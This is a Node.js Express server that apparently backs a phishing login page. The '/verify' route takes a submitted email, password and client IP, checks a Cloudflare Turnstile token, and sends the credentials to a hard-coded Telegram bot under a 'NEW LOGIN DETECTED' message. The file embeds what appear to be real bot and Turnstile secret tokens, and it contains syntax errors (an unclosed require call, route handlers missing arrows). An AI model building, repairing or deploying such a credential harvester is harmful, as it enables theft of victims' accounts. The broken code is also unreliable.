const express = require('express');
const cors = require('cors');
const axios = require('axios';
const path = require('path');

const app = express();

// FIX: Railway sets the PORT environment variable. We MUST use it.
const PORT = process.env.PORT || 3000;

// --- CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = '8272014364:AAGUZGuiiKewLNzQGcZ8ObPETFUF5H-etEc';
const TELEGRAM_CHAT_ID = '5673442015';
const TURNSTILE_SECRET_KEY = '0x4AAAAAAEGO7B0sG8eUjS-qhzq9lJsUuY4';
// ---------------------

app.use(cors());
app.use(express.json());

// Serve HTML (Only if you are hosting the frontend on Railway too)
app.get('/', (req, res) {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Verify Turnstile and Send Telegram
app.post('/verify', async (req, res) {
    console.log("Received verification request");
    const { email, password, turnstileToken } = req.body;

    if (!turnstileToken) {
        console.error("No turnstile token provided");
        return res.status(403).json({ success: false, message: "Security check failed" });
    }

    const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '127.0.0.1';
    const realIP = typeof userIP === 'string' ? userIP.split(',')[0] : userIP;

    try {
        const verificationUrl = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
        const response = await axios.post(verificationUrl, {
            secret: TURNSTILE_SECRET_KEY,
            response: turnstileToken,
            remoteip: realIP
        });

        if (!response.data.success) {
            console.error("Turnstile validation failed:", response.data['error-codes']);
            return res.status(403).json({ success: false, message: "Security check failed" });
        }
        console.log("Turnstile validation successful");
    } catch (error) {
        console.error("Error verifying Turnstile:", error.message);
        return res.status(500).json({ success: false, message: "System error" });
    }

    if (!email || !password) {
        return res.status(400).json({ success: false, message: "Missing credentials" });
    }

    const message = `🚨 **NEW LOGIN DETECTED** 🚨\n\n👤 **Email:** ${email}\n🔑 **Password:** ${password}\n🌐 **IP:** ${realIP}\n⏰ **Time:** ${new Date().toISOString()}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log("Credentials sent to Telegram");
        res.json({ success: true });
    } catch (error) {
        console.error("Telegram error:", error.message);
        res.status(500).json({ success: false, message: "Failed to process data" });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
